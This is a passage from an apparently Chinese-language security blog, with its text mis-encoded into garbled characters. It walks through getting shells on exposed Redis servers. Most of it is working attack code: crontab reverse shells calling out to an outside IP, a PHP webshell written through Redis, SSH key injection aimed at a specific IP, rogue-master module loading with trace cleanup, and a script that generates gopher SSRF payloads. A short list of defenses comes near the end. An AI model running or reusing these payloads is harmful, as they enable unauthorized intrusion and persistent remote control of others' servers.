<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/1.1.1.1/888 0&gt;&amp;1\n&quot;  //åå¼¹ç«¯å£888çš„shell</span><br><span class="line">config set dir /var/spool/cron/  //è®¾ç½®ä¿å­˜çš„è·¯å¾„</span><br><span class="line">config set dbfilename root  //è®¾ç½®æ•°æ®åº“æ–‡ä»¶å</span><br><span class="line">save  //æ•°æ®åº“ä¿å­˜ï¼Œä¿ƒå‘åå¼¹</span><br></pre></td></tr></table></figure>

<ul>
<li>å†™crontabçš„ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $redis = new Redis();</span><br><span class="line">    $redis-&gt;connect(&apos;192.168.0.110&apos;,6380);</span><br><span class="line">    $redis-&gt;flushall();</span><br><span class="line">    $redis-&gt;set(&quot;xxx&quot;,&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/1.1.1.1/888 0&gt;&amp;1\n&quot;);</span><br><span class="line">    $redis-&gt;config(&quot;SET&quot;,&quot;dir&quot;,&quot;/var/spool/cron/&quot;);</span><br><span class="line">    $redis-&gt;config(&quot;SET&quot;,&quot;dbfilename&quot;,&quot;root&quot;);</span><br><span class="line">    $redis-&gt;save();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>â–² Ubuntuä¸‹çš„crontabå¯¹å†™å…¥çš„æ•°æ®æœ‰è¦æ±‚ï¼Œä¸èƒ½å‡ºç°ä¹±ç ï¼Œä½†rediså†™å…¥çš„æ—¶å€™ï¼Œä¼šå°†é…ç½®ä»¥åŠç¼“å­˜æ•°æ®ä¸€èµ·å†™å…¥ï¼Œæ‰€ä»¥æ— æ³•æ‰§è¡Œä»»åŠ¡ï¼Œæ‰§è¡Œä»»åŠ¡ä¼šå‡ºé”™</li>
<li>â–² Ubuntuä¸‹çš„crontabæ‰§è¡Œä»»åŠ¡ä½¿ç”¨çš„æ˜¯/bin/dashï¼Œæ— æ³•è§¦å‘æ‰§è¡Œå®šæ—¶ä»»åŠ¡ï¼Œéœ€è¦ä¿®æ”¹ä¸º/bin/bashæ‰èƒ½è§¦å‘æ‰§è¡Œä»»åŠ¡</li>
</ul>
<h3 id="0X02-web-getshell"><a href="#0X02-web-getshell" class="headerlink" title="0X02 web-getshell"></a>0X02 web-getshell</h3><ul>
<li>å‰æ<ul>
<li>webçš„ç»å¯¹è·¯å¾„</li>
<li>redisæœ‰è¶³å¤Ÿçš„æƒé™</li>
</ul>
</li>
<li>å†™shellçš„ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $redis = new Redis();</span><br><span class="line">    $redis-&gt;connect(&apos;192.168.0.110&apos;,6380);</span><br><span class="line">    $redis-&gt;flushall();</span><br><span class="line">    $redis-&gt;set(&quot;xxx&quot;,&quot;\n&lt;?php eval(\$_GET[&apos;cmd&apos;]);?&gt;\n&quot;);</span><br><span class="line">    $redis-&gt;config(&quot;SET&quot;,&quot;dir&quot;,&quot;/var/www/html/&quot;);</span><br><span class="line">    $redis-&gt;config(&quot;SET&quot;,&quot;dbfilename&quot;,&quot;root.php&quot;);</span><br><span class="line">    $redis-&gt;save();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/redis/web_getshell.png" alt="web-getshell"></p>
<h3 id="0X03-ssh-getshell"><a href="#0X03-ssh-getshell" class="headerlink" title="0X03 ssh-getshell"></a>0X03 ssh-getshell</h3><ul>
<li>é€šè¿‡å†™.sshæ–‡ä»¶ä¸‹çš„authorized_keyè¿›è¡Œgetshell</li>
<li>å†™å…¥æˆåŠŸåé€šè¿‡ç»ˆç«¯è®¾å¤‡è¿›è¡Œè¿æ¥</li>
<li>å†™authorized_keyçš„ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $str = &quot;ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAg8kuNZfIZbHB5Ek5ZPo8SERdxKV7NpLPIpOyAGUXYAZW5k1I4S0+G9wGkcIrJ2kS/cc681NrDjxGlLXXQ/4uWclTGOcLud477Q0pyG1C9AHLQpprcrujbb0mEAuqUfw4F1Nhltz3WdxgdFuJT/dgQ8SJskudh3coUSh5ipjwKEUWmAXTkMfWxU/VJ2DD1n5imOvBqEVEoquy8GXtylLt70ijp481gkSEDoQP3TqTKKbZWEN63d4p7xff+1ZgQHuuWzbmw8G6bWrWWdO7k2k4117lWJi2lJYm4//eauP85iEoqRCm4UBWcnZ6dmGHt4U1oTeGOeyqAQxoJ2/0sdmLjQ== rsa-key-20200612&quot;;</span><br><span class="line">    $redis = new Redis();</span><br><span class="line">    $redis-&gt;connect(&apos;122.51.135.129&apos;,6379);</span><br><span class="line">    $redis-&gt;select(1);</span><br><span class="line">    $redis-&gt;flushall();</span><br><span class="line">    $redis-&gt;set(&quot;xxx&quot;,&quot;\n\n&quot;.$str.&quot;\n\n&quot;);</span><br><span class="line">    $redis-&gt;config(&quot;SET&quot;,&quot;dir&quot;,&quot;/root/.ssh&quot;);</span><br><span class="line">    $redis-&gt;config(&quot;SET&quot;,&quot;dbfilename&quot;,&quot;authorized_keys&quot;);</span><br><span class="line">    $redis-&gt;save();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/redis/authorized_key_getshell.png" alt="authorized_key_getshell"></p>
<h3 id="0X04-ä¸»ä»å¤åˆ¶getshell"><a href="#0X04-ä¸»ä»å¤åˆ¶getshell" class="headerlink" title="0X04 ä¸»ä»å¤åˆ¶getshell"></a>0X04 ä¸»ä»å¤åˆ¶getshell</h3><ul>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>ä½æƒçš„æ—¶å€™ï¼Œredisä»¥rootæƒé™è¿è¡Œï¼Œé€šè¿‡RCEè·å¾—rootæƒé™</li>
<li>æœªæˆæƒç›´æ¥åˆ©ç”¨</li>
</ul>
</li>
<li>ä¸»ä»æ¨¡å¼æµ‹è¯•</li>
</ul>
<p><img src="/images/middleware/redis/slaveof-test.png" alt="slaveof-test"></p>
<ul>
<li>æ¼æ´åˆ©ç”¨ï¼šæ¼æ´å­˜åœ¨äº4.xã€5.xç‰ˆæœ¬ä¸­ï¼ŒRedisæä¾›äº†ä¸»ä»æ¨¡å¼ï¼Œä¸»ä»æ¨¡å¼æŒ‡ä½¿ç”¨ä¸€ä¸ªredisä½œä¸ºä¸»æœºï¼Œå…¶ä»–çš„ä½œä¸ºå¤‡ä»½æœºï¼Œä¸»æœºä»æœºæ•°æ®éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä»æœºåªè´Ÿè´£è¯»ï¼Œä¸»æœºåªè´Ÿè´£å†™ã€‚åœ¨Reids 4.xä¹‹åï¼Œé€šè¿‡å¤–éƒ¨æ‹“å±•ï¼Œå¯ä»¥å®ç°åœ¨redisä¸­å®ç°ä¸€ä¸ªæ–°çš„Rediså‘½ä»¤ï¼Œæ„é€ æ¶æ„.soæ–‡ä»¶ã€‚åœ¨ä¸¤ä¸ªRediså®ä¾‹è®¾ç½®ä¸»ä»æ¨¡å¼çš„æ—¶å€™ï¼ŒRedisçš„ä¸»æœºå®ä¾‹å¯ä»¥é€šè¿‡FULLRESYNCåŒæ­¥æ–‡ä»¶åˆ°ä»æœºä¸Šã€‚ç„¶ååœ¨ä»æœºä¸ŠåŠ è½½æ¶æ„soæ–‡ä»¶ï¼Œå³å¯æ‰§è¡Œå‘½ä»¤</li>
</ul>
<h5 id="æ¼æ´åˆ©ç”¨å·¥å…·"><a href="#æ¼æ´åˆ©ç”¨å·¥å…·" class="headerlink" title="æ¼æ´åˆ©ç”¨å·¥å…·"></a>æ¼æ´åˆ©ç”¨å·¥å…·</h5><ul>
<li>ç”Ÿæˆmodule.soæ–‡ä»¶ <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand" target="_blank" rel="noopener">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></li>
<li>rce-1 <a href="https://github.com/Ridter/redis-rce.git" target="_blank" rel="noopener">https://github.com/Ridter/redis-rce.git</a></li>
<li>rce-2 <a href="https://github.com/LoRexxar/redis-rogue-server" target="_blank" rel="noopener">https://github.com/LoRexxar/redis-rogue-server</a></li>
<li>åˆ©ç”¨è¿‡ç¨‹<ul>
<li>ä¸‹è½½module.soæ–‡ä»¶ï¼Œè¿›è¡Œmakeç¼–è¯‘ï¼Œç”Ÿæˆä¸€ä¸ªmodule.so</li>
<li>å°†moduleå¤åˆ¶åˆ°redis-rceçš„ç›®å½•ä¸­ï¼Œé€šè¿‡ç»ˆç«¯æ‰§è¡Œå‘½ä»¤<code>python redis-rce.py -r ç›®æ ‡ip -p ç›®æ ‡ç«¯å£ -L æœ¬åœ°ip -f module.so</code>ï¼Œè¿›è€Œè·å–shell</li>
</ul>
</li>
</ul>
<h5 id="redis-rceçš„å¤§è‡´åŸç†"><a href="#redis-rceçš„å¤§è‡´åŸç†" class="headerlink" title="redis-rceçš„å¤§è‡´åŸç†"></a>redis-rceçš„å¤§è‡´åŸç†</h5><ul>
<li>é‡‡ç”¨pythonä¼ªè£…æˆredisæ•°æ®åº“ï¼Œç„¶åå—å®³è€…å°†æˆ‘ä»¬çš„æ•°æ®åº“è®¾ç½®ä¸ºä¸»èŠ‚ç‚¹</li>
<li>å°†å¤‡ä»½çš„rdbæ•°æ®åº“å¤‡ä»½æ–‡ä»¶å†…å®¹æ›¿æ¢ä¸ºæ¶æ„çš„soæ–‡ä»¶</li>
<li>è®¾ç½®ä¼ è¾“æ–¹å¼ä¸ºå…¨é‡ä¼ è¾“ï¼Œå°±ä¼šè‡ªåŠ¨åœ¨èŠ‚ç‚¹redisä¸­ç”Ÿæˆexp.so</li>
<li>ç”¨module loadå‘½ä»¤åŠ è½½soæ–‡ä»¶å³å¯å®Œæˆrce</li>
<li>â–² é‡ç‚¹æ˜¯æ”¯æŒå…¨é‡ä¼ è¾“</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.è¯»å–exp.so</span><br><span class="line">2.è°ƒç”¨runserverå‡½æ•°å¤„ç†runserver(options.rhost, options.rport, options.lhost, options.lport) #ç›®æ ‡IPã€ç›®æ ‡ç«¯å£ã€attack IPã€attackç›‘å¬çš„ç«¯å£ï¼ˆé»˜è®¤ç›‘å¬21000ç«¯å£ï¼‰</span><br><span class="line">3.è°ƒç”¨Remote.do() #å‘é€Rediså¯†ç éªŒè¯ï¼Œå¹¶è¿”å›ç»“æœï¼Œå¦‚æœè¿”å›invalid passwordä»£è¡¨å¯†ç é”™è¯¯</span><br><span class="line">4.å¯†ç æ­£ç¡®ï¼Œredisç™»å½•æˆåŠŸåï¼Œå‘é€infoæŒ‡ä»¤æŸ¥çœ‹redisæ•°æ®åº“è¯¦ç»†ä¿¡æ¯</span><br><span class="line">5.å‘é€SLAVEOFæŒ‡ä»¤ï¼ŒæŒ‡ä»¤æ ¼å¼ SLAVEOF host port #ä½œç”¨é€šè¿‡æ‰§è¡Œ SLAVEOF host port å‘½ä»¤ï¼Œå¯ä»¥å°†å½“å‰æœåŠ¡å™¨è½¬å˜ä¸ºæŒ‡å®šæœåŠ¡å™¨çš„ä»å±æœåŠ¡å™¨(slave server)ï¼Œè¿™é‡Œçš„hostå’Œportåˆ™æŒ‡å‘attackçš„IPå’Œç«¯å£</span><br><span class="line">6.å‘é€CONFIG SET dbfilename &lt;name&gt; è®¾ç½®æ–‡ä»¶åç§°(æ ¹æ®exp.soçš„æ–‡ä»¶åæ¥è®¾ç½®çš„æ–‡ä»¶åï¼Œæ¯”å¦‚exp.soã€‚è®¾ç½®çš„dbfilenameå°±æ˜¯exp)</span><br><span class="line">7.ç›‘å¬æœ¬æœº21000ç«¯å£ï¼Œç­‰å¾…rediså›ä¼ çš„æ•°æ®ã€‚æ ¹æ®è¿”å›çš„ç»“æœå°†expè½¬æ¢æˆbytesï¼Œå‘é€exp</span><br><span class="line">8.MODULE LOADæŒ‡ä»¤åŠ è½½exp.so</span><br><span class="line">9.å–æ¶ˆä»å±æœåŠ¡å™¨</span><br><span class="line">10.æ ¹æ®é€‰æ‹©æ˜¯è¿›å…¥shellæˆ–è€…æ‰§è¡Œå…¶ä»–æŒ‡ä»¤</span><br><span class="line">12.è‹¥æ˜¯æ‰§è¡ŒshellæŒ‡ä»¤ï¼Œåˆ™è°ƒç”¨exp.soé‡Œé¢çš„system.execå‡½æ•°åé¢è·Ÿä¸Šå‘½ä»¤ã€‚system.exec &lt;command&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/redis/slaveof-getshell.png" alt="slaveof-getshell"></p>
<h5 id="æœ¬åœ°æ‰‹å·¥æ‰§è¡Œå‘½ä»¤è®¾ç½®å¤‡ä»½"><a href="#æœ¬åœ°æ‰‹å·¥æ‰§è¡Œå‘½ä»¤è®¾ç½®å¤‡ä»½" class="headerlink" title="æœ¬åœ°æ‰‹å·¥æ‰§è¡Œå‘½ä»¤è®¾ç½®å¤‡ä»½"></a>æœ¬åœ°æ‰‹å·¥æ‰§è¡Œå‘½ä»¤è®¾ç½®å¤‡ä»½</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.config set dir ./</span><br><span class="line">2.config set dbfilename exp.so</span><br><span class="line">3.slaveof X.X.X.195</span><br><span class="line">4.slaveof X.X.X.195 21000  #ä¸Šé¢çœ‹ç»‘å®šçš„æœåŠ¡æ®µç«¯å£æ˜¯21000</span><br><span class="line">5. module load ./exp.so</span><br><span class="line">6.slaveof no one</span><br><span class="line">7.system.exec &apos;whoami&apos;</span><br><span class="line"></span><br><span class="line">æ¸…ç†ç—•è¿¹</span><br><span class="line">8.config set dbfilename dump.rdb</span><br><span class="line">9.system.exec &apos;rm ./exp.so&apos;</span><br><span class="line">10.module unload system</span><br></pre></td></tr></table></figure>

<h5 id="ç¦ç”¨configå‘½ä»¤ç»•è¿‡"><a href="#ç¦ç”¨configå‘½ä»¤ç»•è¿‡" class="headerlink" title="ç¦ç”¨configå‘½ä»¤ç»•è¿‡"></a>ç¦ç”¨configå‘½ä»¤ç»•è¿‡</h5><ul>
<li>å¦‚æœåœ¨redis.confé…ç½®äº†ç¦ç”¨configå‘½ä»¤çš„æ—¶å€™ </li>
<li>ç»•è¿‡æ–¹æ³•</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rename-command CONFIG &quot;&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>é™åˆ¶<ul>
<li>è™½ç„¶æ­¤æ—¶æ²¡æœ‰åŠæ³•è‡ªå®šä¹‰æ–‡ä»¶åç¼€ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥åˆ©ç”¨ä¸»ä»å¤åˆ¶</li>
<li>åç»­åªéœ€è¦æŠŠdump.rdpå½“æˆexp.soå»æ­£å¸¸åŠ è½½å³å¯</li>
</ul>
</li>
</ul>
<h3 id="0X04-åè®®è¯»å–redis"><a href="#0X04-åè®®è¯»å–redis" class="headerlink" title="0X04 åè®®è¯»å–redis"></a>0X04 åè®®è¯»å–redis</h3><ul>
<li>â–² rediså®˜æ–¹ä½¿ç”¨çš„RESPåè®®</li>
<li>å®¢æˆ·ç«¯ä¸redisæœåŠ¡ç«¯çš„äº¤äº’æµç¨‹<ul>
<li>å®¢æˆ·ç«¯å‘RedisæœåŠ¡å™¨å‘é€ä¸€ä¸ªä»…ç”±Bulk Stringsç»„æˆçš„RESP Arrays</li>
<li>RedisæœåŠ¡å™¨å›å¤å‘é€ä»»ä½•æœ‰æ•ˆRESPæ•°æ®ç±»å‹ä½œä¸ºå›å¤çš„å®¢æˆ·ç«¯</li>
</ul>
</li>
<li>Bulk Stringsç”¨äºè¡¨ç¤ºé•¿åº¦æœ€å¤§ä¸º512 MBçš„å•ä¸ªäºŒè¿›åˆ¶å®‰å…¨å­—ç¬¦ä¸²ï¼ŒæŒ‰ä»¥ä¸‹æ–¹å¼ç¼–ç ï¼š<ul>
<li>ä¸€ä¸ª$å­—èŠ‚åè·Ÿç»„æˆå­—ç¬¦ä¸²çš„å­—èŠ‚æ•°ï¼ˆä¸€ä¸ªå‰ç¼€é•¿åº¦ï¼‰ï¼Œç”±CRLFç»ˆæ­¢ã€‚</li>
<li>å®é™…çš„å­—ç¬¦ä¸²æ•°æ®</li>
<li>æœ€ç»ˆçš„CRLF</li>
<li>å¦‚å­—ç¬¦ä¸²foobarç¼–ç åä¸º$6\r\nfoobar\r\n</li>
</ul>
</li>
<li>RESP Arraysä½¿ç”¨ä»¥ä¸‹æ ¼å¼å‘é€<ul>
<li>ä¸€ä¸ª*å­—ç¬¦ä½œä¸ºç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œåè·Ÿæ•°ç»„ä¸­çš„å…ƒç´ æ•°ä½œä¸ºåè¿›åˆ¶æ•°ï¼Œåè·ŸCRLF</li>
<li>æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½é™„åŠ RESPç±»å‹</li>
</ul>
</li>
<li>æ•°æ®åŒ…çš„ç†è§£<ul>
<li>æ¯ä¸€ä¸ª*numberä»£è¡¨æ¯ä¸€è¡Œå‘½ä»¤ï¼Œnumberä»£è¡¨æ¯è¡Œå‘½ä»¤ä¸­æ•°ç»„ä¸­çš„å…ƒç´ ä¸ªæ•°ã€‚$numberä»£è¡¨æ¯ä¸ªå…ƒç´ çš„é•¿åº¦</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*1</span><br><span class="line">$8</span><br><span class="line">flushall</span><br><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$1</span><br><span class="line">1</span><br><span class="line">$22</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">//ä»£è¡¨çš„å‘½ä»¤è¡Œ</span><br><span class="line">flushall</span><br><span class="line">set 1 &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="gopheråè®®"><a href="#gopheråè®®" class="headerlink" title="gopheråè®®"></a>gopheråè®®</h5><ul>
<li>gopheræ”¯æŒå¤šè¡Œï¼Œä¹Ÿå³å¯ä»¥è¿›è¡Œæ”»å‡»éœ€è¦è®¤è¯çš„redis</li>
<li>æ ¼å¼ï¼šgopher://ip:port/_<ul>
<li>è¦åœ¨ä¼ è¾“æ•°æ®å‰åŠ ä¸€ä¸ªæ— ç”¨çš„å­—ç¬¦ï¼Œgopheråè®®ä¼šå°†ç¬¬ä¸€ä¸ªå­—ç¬¦â€åƒæ‰â€</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//éæ ‡å‡†çš„è¯·æ±‚</span><br><span class="line">curl &quot;gopher://127.0.0.1:6379/_auth%20root%0d%0aset%20a%20test&quot;</span><br><span class="line"></span><br><span class="line">//æ ‡å‡†çš„è¯·æ±‚ï¼ˆRESPæ ¼å¼ï¼‰</span><br><span class="line">curl &quot;gopher://127.0.0.1:6379/_*3%0d%0A%243%0d%0Aset%0d%0A%241%0d%0A1%0d%0A%243%0d%0A123&quot;</span><br></pre></td></tr></table></figure>

<h5 id="dictåè®®"><a href="#dictåè®®" class="headerlink" title="dictåè®®"></a>dictåè®®</h5><ul>
<li>dictæ ¼å¼ä¸æ”¯æŒå¤šè¡Œï¼Œä¹Ÿå³æ— æ³•æ”»å‡»éœ€è¦è®¤è¯çš„redis</li>
<li>æ ¼å¼ï¼šdict://serverip:port/name:data<ul>
<li>å‘æœåŠ¡å™¨çš„ç«¯å£è¯·æ±‚name dataï¼Œå¹¶åœ¨æœ«å°¾ è‡ªåŠ¨è¡¥ä¸Šrn(CRLF)ç»“æœæµ‹è¯•å…¶å®è¿˜ä¼šå‘é€ä¸€ä¸ªQUIT</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl &quot;dict://127.0.0.1:6379/set:1:123&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>åœ¨å®éªŒä¸­å‘ç°ï¼Œæ”¯æŒå•è¡Œçš„commandæ‰§è¡Œå‘é€ï¼Œä¸éœ€è¦clientç«¯å‘é€CLINETçš„å‘½ä»¤ï¼Œè™½ç„¶å­˜åœ¨æŠ¥é”™ï¼Œä½†æ˜¯è¿˜æ˜¯æˆåŠŸæ‰§è¡Œ</li>
</ul>
<p><img src="/images/middleware/redis/dict-client.png" alt="dict-client"></p>
<h3 id="é€šç”¨åˆ©ç”¨è„šæœ¬"><a href="#é€šç”¨åˆ©ç”¨è„šæœ¬" class="headerlink" title="é€šç”¨åˆ©ç”¨è„šæœ¬"></a>é€šç”¨åˆ©ç”¨è„šæœ¬</h3><ul>
<li>è„šæœ¬æ¥è‡ªxq17å¸ˆå‚…</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"># -*-coding:utf-8-*-</span><br><span class="line"># author:xq17</span><br><span class="line"></span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line">def tranToResp(x):</span><br><span class="line">        xSplit = x.split(&quot; &quot;)</span><br><span class="line">        cmd=&quot;&quot;</span><br><span class="line">        cmd+=&quot;*&quot;+str(len(xSplit))</span><br><span class="line">        for i in xSplit:</span><br><span class="line">            i = i.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class="line">            cmd+=&quot;\r\n&quot;+&quot;$&quot;+str(len(i))+&quot;\r\n&quot;+ i</span><br><span class="line">        cmd+=&quot;\r\n&quot;</span><br><span class="line">        return cmd</span><br><span class="line"></span><br><span class="line">def GeneratePayload(ip, port):</span><br><span class="line">    cmd=[</span><br><span class="line">     &quot;config set dir ./&quot;,</span><br><span class="line">     &quot;config set dbfilename exp.so&quot;,</span><br><span class="line">     &quot;slaveof &#123;i&#125; &#123;p&#125;&quot;.format(i=ip, p=port),</span><br><span class="line">     &quot;module load exp.so&quot;,</span><br><span class="line">     &quot;system.exec ls&quot;,</span><br><span class="line">     &quot;system.exec rm$&#123;IFS&#125;exp.so&quot;,</span><br><span class="line">     &quot;quit&quot;,</span><br><span class="line">     ]</span><br><span class="line">     # &quot;system.exec bash$&#123;IFS&#125;-i$&#123;IFS&#125;&gt;&amp;$&#123;IFS&#125;/dev/tcp/192.168.8.103/4607$&#123;IFS&#125;0&gt;&amp;1&quot;,</span><br><span class="line">    payload = &quot;&quot;</span><br><span class="line">    for p in cmd:</span><br><span class="line">        payload += urllib.parse.quote(tranToResp(p))</span><br><span class="line">    return payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # target</span><br><span class="line">    ip = &quot;127.0.0.1&quot;</span><br><span class="line">    port = &quot;6383&quot;</span><br><span class="line">    # server load exp.so</span><br><span class="line">    serverIp = &quot;101.x.x.x&quot;</span><br><span class="line">    serverPort = &quot;21000&quot;</span><br><span class="line">    authPass = &quot;123123&quot;</span><br><span class="line">    payload = GeneratePayload(serverIp, serverPort)</span><br><span class="line">    exitPayload = (urllib.parse.quote(tranToResp(&quot;slaveof no one&quot;) + tranToResp(&quot;quit&quot;) ))</span><br><span class="line">    if authPass:</span><br><span class="line">        print(&quot;author attack:&quot;)</span><br><span class="line">        pd = &quot;gopher://&#123;host&#125;:&#123;port&#125;/_%2a%32%0d%0a%24%34%0d%0a%61%75%74%68%0d%0a%24&#123;l&#125;%0d%0a&#123;p&#125;%0d%0a&quot;</span><br><span class="line">        pd = pd.format(host=ip, port=port, l=str(len(authPass)), p=authPass)</span><br><span class="line">        print(pd + payload)</span><br><span class="line">        print(&quot;clean footprint:&quot;)</span><br><span class="line">        print(pd + exitPayload)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;no author attack:&quot;)</span><br><span class="line">        pd = &quot;gopher://&#123;host&#125;:&#123;port&#125;/_&quot;</span><br><span class="line">        print(pd.format(host=ip, port=port)+payload)</span><br><span class="line">        print(&quot;clean footprint:&quot;)</span><br><span class="line">        print(pd.format(host=ip, port=port) + exitPayload)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="é˜²èŒƒæªæ–½"><a href="#é˜²èŒƒæªæ–½" class="headerlink" title="é˜²èŒƒæªæ–½"></a>é˜²èŒƒæªæ–½</h3><ul>
<li>è®¾ç½®æœ¬æœºæ‰èƒ½è®¿é—®</li>
<li>è®¾ç½®å¤æ‚æ€§å¯†ç </li>
<li>redis-serverä¸ä»¥rootæƒé™è¿è¡Œ</li>
</ul>
<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul>
<li><a href="http://www.vkxss.top/2019/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%B9%8Bubuntu%E5%8F%8D%E5%BC%B9shell%E9%97%AE%E9%A2%98/index.html" target="_blank" rel="noopener">Ubuntuä¸‹rediså†™crontabé‡åˆ°çš„å‘</a></li>
<li><a href="https://paper.seebug.org/1169/" target="_blank" rel="noopener">ç»†æ•°redisçš„å‡ ç§getshellæ–¹æ³•</a></li>
<li><a href="https://www.freebuf.com/vuls/224235.html" target="_blank" rel="noopener">è®°ä¸€æ¬¡Redis+Getshellç»éªŒåˆ†äº«</a></li>
<li><a href="https://www.cnblogs.com/kismetv/p/9236731.html" target="_blank" rel="noopener">æ·±å…¥å­¦ä¹ Redisï¼ˆ3ï¼‰ï¼šä¸»ä»å¤åˆ¶</a></li>
<li><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">Pavel Toporkovåˆ†äº«çš„rceæ–¹å¼</a></li>
<li><a href="https://422926799.github.io/posts/ac34060e.html" target="_blank" rel="noopener">redis-rceçš„åŸç†</a></li>
<li><a href="https://redis.io/topics/protocol" target="_blank" rel="noopener">redis-RESP</a></li>
<li><a href="https://xz.aliyun.com/t/7974#toc-11" target="_blank" rel="noopener">æµ…æLinuxä¸‹Redisçš„æ”»å‡»é¢(ä¸€)</a></li>
</ul>
]]></content>
      <categories>
        <category>middleware</category>
      </categories>
  </entry>
  <entry>
    <title>WebShellä¸‹ç»•è¿‡disable_function</title>
    <url>/2020/10/27/md%E6%96%87%E4%BB%B6/bypass_disable_function/</url>
    <content><![CDATA[<h2 id="WebShellä¸‹ç»•è¿‡disable-function"><a href="#WebShellä¸‹ç»•è¿‡disable-function" class="headerlink" title="WebShellä¸‹ç»•è¿‡disable_function"></a>WebShellä¸‹ç»•è¿‡disable_function</h2><h3 id="0X00-Webshellæ¦‚è¦"><a href="#0X00-Webshellæ¦‚è¦" class="headerlink" title="0X00 Webshellæ¦‚è¦"></a>0X00 Webshellæ¦‚è¦</h3><h5 id="WebShellæ— æ³•æ‰§è¡Œå‘½ä»¤çš„åŸå› "><a href="#WebShellæ— æ³•æ‰§è¡Œå‘½ä»¤çš„åŸå› " class="headerlink" title="WebShellæ— æ³•æ‰§è¡Œå‘½ä»¤çš„åŸå› "></a>WebShellæ— æ³•æ‰§è¡Œå‘½ä»¤çš„åŸå› </h5><ul>
<li>php.ini ä¸­ç”¨ disable_functions æŒ‡ç¤ºå™¨ç¦ç”¨äº† system()ã€exec() ç­‰ç­‰è¿™ç±»å‘½ä»¤æ‰§è¡Œçš„ç›¸å…³å‡½æ•°</li>
<li>web è¿›ç¨‹è¿è¡Œåœ¨ rbash è¿™ç±»å—é™ shell ç¯å¢ƒä¸­  -&gt;  å¯æ‰§è¡Œå°‘é‡ç³»ç»Ÿå‘½ä»¤</li>
<li>WAF æ‹¦åŠ«  -&gt;  å¯æ‰§è¡Œå°‘äº†ç³»ç»Ÿå‘½ä»¤</li>
</ul>
<h5 id="ç»•è¿‡disable-functionæ–¹æ³•"><a href="#ç»•è¿‡disable-functionæ–¹æ³•" class="headerlink" title="ç»•è¿‡disable_functionæ–¹æ³•"></a>ç»•è¿‡disable_functionæ–¹æ³•</h5><ul>
<li>æ”»å‡»åç«¯ç»„ä»¶ï¼Œå¯»æ‰¾å­˜åœ¨å‘½ä»¤æ³¨å…¥çš„ã€web åº”ç”¨å¸¸ç”¨çš„åç«¯ç»„ä»¶ï¼Œå¦‚ï¼ŒImageMagick çš„é­”å›¾æ¼æ´ã€bash çš„ç ´å£³æ¼æ´</li>
<li>å¯»æ‰¾æœªç¦ç”¨çš„æ¼ç½‘å‡½æ•°ï¼Œå¸¸è§çš„æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰ system()ã€exec()ã€shell_exec()ã€passthru()ï¼Œååƒ»çš„ popen()ã€proc_open()ã€pcntl_exec()ï¼Œé€ä¸€å°è¯•</li>
<li>mod_cgi æ¨¡å¼ï¼Œå°è¯•ä¿®æ”¹ .htaccessï¼Œè°ƒæ•´è¯·æ±‚è®¿é—®è·¯ç”±ï¼Œç»•è¿‡ php.ini ä¸­çš„ä»»ä½•é™åˆ¶</li>
<li>åˆ©ç”¨ç¯å¢ƒå˜é‡ LD_PRELOAD åŠ«æŒç³»ç»Ÿå‡½æ•°ï¼Œè®©å¤–éƒ¨ç¨‹åºåŠ è½½æ¶æ„ *.soï¼Œè¾¾åˆ°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ•ˆæœ</li>
</ul>
